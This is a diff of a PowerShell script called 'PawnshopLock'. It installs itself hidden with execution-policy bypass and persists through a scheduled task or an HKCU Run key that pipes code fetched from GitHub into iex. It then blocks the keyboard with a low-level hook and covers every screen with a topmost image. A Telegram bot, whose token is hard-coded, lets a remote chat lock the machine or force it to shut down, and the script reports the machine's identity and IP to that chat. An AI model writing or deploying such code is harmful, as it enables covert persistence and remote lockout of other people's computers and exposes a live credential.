@@ -1,108 +1,128 @@
-# =============================================================
-# PawnshopLock v4.0  –  ONE‑FILE Installer **and** Background Service
-# -------------------------------------------------------------
-# ▸ Run once on each computer with:  (Win+R)
-#     powershell -w hidden -ep Bypass -Command "iwr https://raw.githubusercontent.com/diezul/x/main/pawnshoplock.ps1 | iex"
-# ▸ After that the service auto‑starts at every log‑on, stays hidden
-# ▸ Telegram commands (case‑insensitive):
-#       /lock<USERNAME>      – show fullscreen lock, block keyboard
-#       /unlock<USERNAME>    – hide lock (or press local 'C')
-#       /shutdown<USERNAME>  – shut the PC down
-# =============================================================
-
-param([string]$Mode = "install")  # internal switch – DO NOT CHANGE
-
-# ---------------------------- GLOBAL SETTINGS ---------------------------
-$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'   # lock‑screen image
-$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'          # Telegram Bot API token
-$chatID   = '656189986'                                               # allowed chat‑id
-$taskName = 'PawnshopLockService'                                     # scheduled task name
-$installDir = "$env:ProgramData\PawnshopLock"                       # local install dir
-$svcFile    = "$installDir\pawnlock_service.ps1"                   # background service script file
+# =========================================================
+# PawnshopLock – STA‑safe, auto‑startup, no emojis
+# =========================================================
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-# -----------------------------------------------------------------------
 
-#########################################################################
-#  SERVICE CODE  (runs with argument "run")                              #
-#########################################################################
-$ServiceCode = @"
-# ================= PawnshopLock Background Service =====================
-param()
-
-# SETTINGS (auto‑filled by installer)
-\$imageURL = '$imageURL'
-\$botToken = '$botToken'
-\$chatID   = '$chatID'
-
-\$user = \$env:USERNAME
-\$pc   = \$env:COMPUTERNAME
-\$lockCmd   = "/lock\$user".ToLower()
-\$unlockCmd = "/unlock\$user".ToLower()
-\$shutCmd   = "/shutdown\$user".ToLower()
-
-\$tempImg = "\$env:TEMP\\pawnlock.jpg"
-Invoke-WebRequest \$imageURL -OutFile \$tempImg -UseBasicParsing
-
-function SendTG([string]\$msg){ try{ \$b=@{chat_id=\$chatID;text=\$msg}|ConvertTo-Json -Compress; Invoke-RestMethod "https://api.telegram.org/bot\$botToken/sendMessage" -Method POST -Body \$b -ContentType 'application/json' -TimeoutSec 10 }catch{} }
-function GetIPs(){ try{ \$l=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{ \$_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress }catch{ \$l='n/a'}; try{ \$p=Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5 }catch{\$p='n/a'}; "\$l | \$p" }
-
-# -------- KeyBlocker ---------------------------------------------------
-Add-Type @'
-using System;using System.Runtime.InteropServices;using System.Windows.Forms;
-public class KB{static IntPtr h=IntPtr.Zero;delegate IntPtr P(int c,IntPtr w,IntPtr l);static P d=Hook;const int WH=13,WM1=0x100,WM2=0x104;[DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);[DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);[DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int c,IntPtr w,IntPtr l);[DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
-public static void Block(){if(h==IntPtr.Zero)h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);} public static void Unblock(){if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;}}
-static IntPtr Hook(int n,IntPtr w,IntPtr l){ if(n>=0&&(w==(IntPtr)WM1||w==(IntPtr)WM2)){int vk=System.Runtime.InteropServices.Marshal.ReadInt32(l); if(vk==0x43) return CallNextHookEx(h,n,w,l); return (IntPtr)1;} return CallNextHookEx(h,n,w,l);} }
-'@
-
-# -------- Fullscreen Lock Form ----------------------------------------
-Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-\$lockForm=\$null
-function Show-Lock{
-    if(\$lockForm){return}
-    [KB]::Block()
-    \$lockForm=@(foreach(\$scr in [Windows.Forms.Screen]::AllScreens){
-        \$f=New-Object Windows.Forms.Form -Property @{FormBorderStyle='None';WindowState='Maximized';StartPosition='Manual';TopMost=\$true;Location=\$scr.Bounds.Location;Size=\$scr.Bounds.Size;BackColor='Black';KeyPreview=\$true}
-        \$pb=New-Object Windows.Forms.PictureBox -Property @{Image=[Drawing.Image]::FromFile(\$tempImg);Dock='Fill';SizeMode='StretchImage'}
-        \$f.Controls.Add(\$pb); \$f.Add_Deactivate({\$.Activate()}); \$f.Add_KeyDown({ if(\$_.KeyCode -eq 'C'){Hide-Lock}; \$_.Handled=\$true}); \$f.Show(); \$f })
-    SendTG "🔒 \$pc locked."
-}
-function Hide-Lock{
-    if(!\$lockForm){return}
-    foreach(\$f in \$lockForm){try{\$f.Close()}catch{}}
-    \$lockForm=\$null; [KB]::Unblock(); SendTG "🔓 \$pc unlocked."
-}
-
-# -------- Initial online ping -----------------------------------------
-SendTG "✅ Pawnshop service online on \$pc (\$user). IPs: \$(GetIPs)`nCommands:`n \$lockCmd`n \$unlockCmd`n \$shutCmd"
-
-# -------- Telegram long‑poll loop -------------------------------------
-\$offset=0
-while(
-  $true){try{ \$u=Invoke-RestMethod "https://api.telegram.org/bot\$botToken/getUpdates?timeout=30&offset=\$offset" -TimeoutSec 35; foreach(\$m in \$u.result){ \$offset=\$m.update_id+1; \$txt=\$m.message.text.ToLower(); if(\$m.message.chat.id-ne [int]\$chatID){continue}; switch(\$txt){ { \$txt -eq \$lockCmd } { Show-Lock;break } { \$txt -eq \$unlockCmd } { Hide-Lock;break } { \$txt -eq \$shutCmd } { SendTG "⏹ Shutting down \$pc"; Stop-Computer -Force } } } }catch{ Start-Sleep 5 }}
-"@  # end of here‑string ServiceCode
-#########################################################################
-
-# ======================= INSTALLER  SECTION ============================
-if($Mode -eq 'run'){
-    # we are already the service – execute code and quit outer script
-    Invoke-Expression $ServiceCode
+# ---------- FORCE STA if needed --------------------------
+if ([Threading.Thread]::CurrentThread.ApartmentState -ne 'STA') {
+    $argsLine = '"' + $MyInvocation.MyCommand.Path + '"'
+    Start-Process powershell -WindowStyle Hidden -ArgumentList @('-Sta','-ExecutionPolicy','Bypass','-File',"$argsLine")
     exit
 }
 
-# -------- Create install dir & write service script -------------------
-New-Item -ItemType Directory -Path $installDir -Force | Out-Null
-$ServiceCode | Out-File -FilePath $svcFile -Encoding UTF8 -Force
+# ---------- CONFIG ---------------------------------------
+$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
+$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
+$chatID   = 656189986       # integer, not string
+$rawURL   = 'https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1'
+# ----------------------------------------------------------
 
-# -------- Register scheduled task -------------------------------------
-$action  = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$svcFile`" run"
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-$IsAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+# ---------- Autorun entry --------------------------------
+$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+$val    = 'PawnshopLock'
+$cmd    = "powershell -w hidden -ep Bypass -Command `"iwr $rawURL | iex`""
+try {
+    if ((Get-ItemProperty $runKey -Name $val -ErrorAction SilentlyContinue).$val -ne $cmd) {
+        New-Item -Path $runKey -Force | Out-Null
+        Set-ItemProperty -Path $runKey -Name $val -Value $cmd
+    }
+} catch {}
+
+# ---------- runtime vars ---------------------------------
+$user   = $env:USERNAME
+$pc     = $env:COMPUTERNAME
+$lockC  = "/lock$user".ToLower()
+$unlkC  = "/unlock$user".ToLower()
+$shutC  = "/shutdown$user".ToLower()
+
+$tempImg = "$env:TEMP\pawnlock.jpg"
+try { Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing } catch {}
+
+function TG([string]$m){
+    try{
+        @{chat_id=$chatID;text=$m} | ConvertTo-Json -Compress |
+            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
+              -Method POST -ContentType 'application/json' -TimeoutSec 10
+    }catch{}
+}
+function LocalIP{
+    try{
+        (Get-NetIPAddress -AddressFamily IPv4 |
+            Where-Object { $_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress
+    }catch{'n/a'}
+}
+
+# ---------- Key blocker ----------------------------------
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+public class KB {
+  static IntPtr h=IntPtr.Zero;
+  delegate IntPtr P(int n,IntPtr w,IntPtr l);
+  static P d=Hook;
+  const int WH=13,WM1=0x100,WM2=0x104;
+  [DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);
+  [DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
+  [DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
+  [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
+  public static void Block(){ if(h==IntPtr.Zero)h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);}
+  public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;}}
+  static IntPtr Hook(int n,IntPtr w,IntPtr l){
+    if(n>=0&&(w==(IntPtr)WM1||w==(IntPtr)WM2)){
+      int vk=Marshal.ReadInt32(l); if(vk==0x43) return CallNextHookEx(h,n,w,l); return (IntPtr)1;
+    }
+    return CallNextHookEx(h,n,w,l);
+  }
+}
+"@
+
+# ---------- Overlay --------------------------------------
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$forms=$null
+function Lock-Screen{
+    if($forms){return}
+    [KB]::Block(); $forms=@()
+    foreach($s in [Windows.Forms.Screen]::AllScreens){
+        $f=New-Object Windows.Forms.Form -Property @{
+            FormBorderStyle='None';WindowState='Maximized';StartPosition='Manual';TopMost=$true;
+            Location=$s.Bounds.Location;Size=$s.Bounds.Size;BackColor='Black';KeyPreview=$true}
+        $pb=New-Object Windows.Forms.PictureBox -Property @{Image=[Drawing.Image]::FromFile($tempImg);Dock='Fill';SizeMode='StretchImage'}
+        $f.Controls.Add($pb)
+        $f.Add_Deactivate({ $_.Activate() })
+        $f.Add_KeyDown({ if($_.KeyCode -eq 'C'){ Unlock-Screen }; $_.Handled=$true })
+        $f.Show(); $forms+=$f
+    }
+    TG "$pc locked."
+}
+function Unlock-Screen{
+    if(!$forms){return}
+    foreach($f in $forms){try{$f.Close()}catch{}}
+    $forms=$null; [KB]::Unblock(); TG "$pc unlocked."
+}
+
+# ---------- initial ping ---------------------------------
+TG "Service online on $pc ($user) | IP: $(LocalIP())"
+
+# ---------- initialise offset to discard backlog ----------
 try{
-    if($IsAdmin){ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null }
-    else         { Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force           | Out-Null }
-}catch{}
+    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 10
+    if($init.result.Count -gt 0){ $offset = ($init.result | Select-Object -Last 1).update_id + 1 }
+    else                        { $offset = 0 }
+}catch{ $offset = 0 }
 
-# -------- Launch service immediately ----------------------------------
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$svcFile`" run"
-exit # installer finished
+# ---------- polling loop ---------------------------------
+while($true){
+    try{
+        $u=Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=25&offset=$offset" -TimeoutSec 30
+        foreach($m in $u.result){
+            $offset=$m.update_id+1
+            $txt=$m.message.text.ToLower() -replace '@\\S+','' -replace '\\s+',''
+            if($m.message.chat.id -ne $chatID){continue}
+            if($txt -eq $lockC)      { Lock-Screen }
+            elseif($txt -eq $unlkC)  { Unlock-Screen }
+            elseif($txt -eq $shutC)  { TG "$pc shutting down."; Stop-Computer -Force }
+        }
+    }catch{ Start-Sleep 5 }
+    [System.Windows.Forms.Application]::DoEvents()
+}
